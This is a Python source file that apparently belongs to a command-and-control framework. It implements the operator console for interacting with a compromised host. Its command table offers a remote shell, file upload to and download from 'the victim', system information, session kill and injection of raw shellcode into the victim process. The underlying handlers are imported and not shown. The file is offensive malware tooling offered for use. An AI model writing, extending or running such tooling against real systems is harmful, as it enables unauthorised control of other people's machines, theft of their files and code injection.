''' This file will contain a method that will be called when the interact command will be used. This will act a sort of another CLI as well. '''
from tabulate import tabulate
from CLI.methods.interact.interact import *
from CLI.listeners import Connection
from CLI.utils.colors import *

def CLEAR(*args):
    from os import system, name
    system("cls" if name == "nt" else "clear")

def HELP(*args):
    data = [[item[0], item[1][0]] for item in COMMANDS.items() if item[1][2]]
    print(
        "\n",
        tabulate(
            data,
            headers=["Command", "Description"]
        ),
        "\n"
    )

COMMANDS = {
    "HELP"      : ("Display the help menu", HELP, False),
    "OPTIONS"   : ("Display the help menu", HELP, False),
    "EXIT"      : ("Exit the program", EXIT, False),
    "QUIT"      : ("Exit the program", EXIT, False),
    "CLEAR"     : ("Clear the screen", CLEAR, False),
    "CLS"       : ("Clear the screen", CLEAR, False),

    "SHELL"   : ("Spawn an interactive shell on the system", SHELL, True),
    "SYSTEMINFO" : ("Display system information", SYSTEMINFO, True),
    "UPLOAD"  : ("Upload a file to the victim", UPLOAD, True),
    "PUT"       : ("Upload a file to the victim", UPLOAD, False),
    "DOWNLOAD"    : ("Download a file from the victim", DOWNLOAD, True),
    "GET"    : ("Download a file from the victim", DOWNLOAD, False),

    "INJECT" : ("Inject a raw shellcode binary into the victim process (as a new thread)", INJECT, True),
    "KILL" : ("KILLS the session", KILL, True),
}

def parse_input(
    input_string : str
):
    if input_string == "" or input_string == None:
        return

    input_string = input_string.strip()
    cmds = input_string.split()
    
    if cmds[0].upper() not in COMMANDS.keys():
        print(f"[{Fore.RED}-{Fore.RESET}] Invalid Command")
        return

    COMMANDS[cmds[0].upper()][1](cmds[1:] if len(cmds) > 1 else None)

def _interact(data : Connection):
    Handle.conn = data
    log_info(f"Interacting with [MAGENTA]{data.UID}[RESET] running [BLUE]{data.OS}[RESET]")
    from utils.utils import basic_prompt, prompt

    while Handle.is_running:
        try:
            parse_input(
                input(
                    f"({Fore.MAGENTA}{data.UID}{Fore.RESET}) {basic_prompt} {prompt} "
                )
            )
        except KeyboardInterrupt:
            print()
            continue
        except EOFError:
            print()
            break

        except Exception as E:
            log_error("An Error occurred!", E)
            continue

    Handle.conn = None
    Handle.is_running = True